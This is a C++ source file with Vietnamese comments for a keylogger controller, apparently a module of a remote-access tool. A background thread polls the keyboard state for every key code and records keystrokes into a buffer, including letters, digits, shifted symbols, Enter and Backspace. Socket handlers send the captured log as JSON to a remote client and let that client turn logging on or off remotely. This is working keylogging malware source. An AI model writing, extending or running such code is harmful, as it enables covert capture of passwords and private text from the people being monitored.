// controllers/KeylogController.cpp
#include "KeylogController.h"
#include "../utils/helpers.h" // Can sendFileResponse, jsonEscape
#include <windows.h>
#include <mutex>
#include <atomic>
#include <thread>
#include <sstream>

using namespace std;

// --- State (trang thai) rieng cua Keylogger ---
// Duoc khai bao 'static' de chung ton tai suot chuong trinh
// va chi duoc truy cap boi cac ham trong file nay.
static string keylogBuffer = "";
static mutex logMutex;
static atomic<bool> keylogEnabled(false);

/**
 * @brief Ham chay trong luong rieng biet de bat ban phim.
 * (Day la ham private, static)
 */
static void KeyLogger()
{
    while (true)
    {
        if (!keylogEnabled.load()) // Kiem tra co dang bat hay khong
        {
            Sleep(200);
            continue;
        }
        Sleep(10);                    // Giam tai CPU
        for (int i = 1; i < 256; i++) // Lap qua tat ca cac ma phim
        {
            if (GetAsyncKeyState(i) == -32767) // Kiem tra xem phim co vua duoc NHAN XUONG
            {
                lock_guard<mutex> lock(logMutex); // Khoa bo dem
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001);
                // Xu ly phim chu (A-Z)
                if (i >= 65 && i <= 90)
                {
                    keylogBuffer += shift ? (char)i : (char)(i + 32);
                }
                // Xu ly phim so (0-9) va ky tu dac biet
                else if (i >= 48 && i <= 57)
                {
                    string s = ")!@#$%^&*(";
                    keylogBuffer += shift ? s[i - 48] : (char)i;
                }
                // Xu ly cac phim chuc nang
                else if (i == VK_SPACE)
                    keylogBuffer += " ";
                else if (i == VK_RETURN)
                    keylogBuffer += "\n[ENTER]\n";
                else if (i == VK_BACK)
                    keylogBuffer += "[BS]";
                else if (i == VK_TAB)
                    keylogBuffer += "[TAB]";
                else if (i == VK_OEM_PERIOD)
                    keylogBuffer += shift ? ">" : ".";
            }
        }
    }
}

// --- Public Handlers ---

void KeylogController::startKeyLoggerThread()
{
    thread(KeyLogger).detach(); // Bat dau luong keylogger
}

void KeylogController::handleGetKeylog(SOCKET client)
{
    lock_guard<mutex> lock(logMutex); // Khoa de doc buffer
    string safeLog = jsonEscape(keylogBuffer);
    sendFileResponse(client, "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}", "application/json");
    keylogBuffer = ""; // Xoa buffer sau khi gui
}

void KeylogController::handleSetKeylog(SOCKET client, const string &body)
{
    bool newState = (body.find("true") != string::npos);
    keylogEnabled.store(newState); // Dat trang thai moi
    sendFileResponse(client, "{\"ok\":true}", "application/json");
}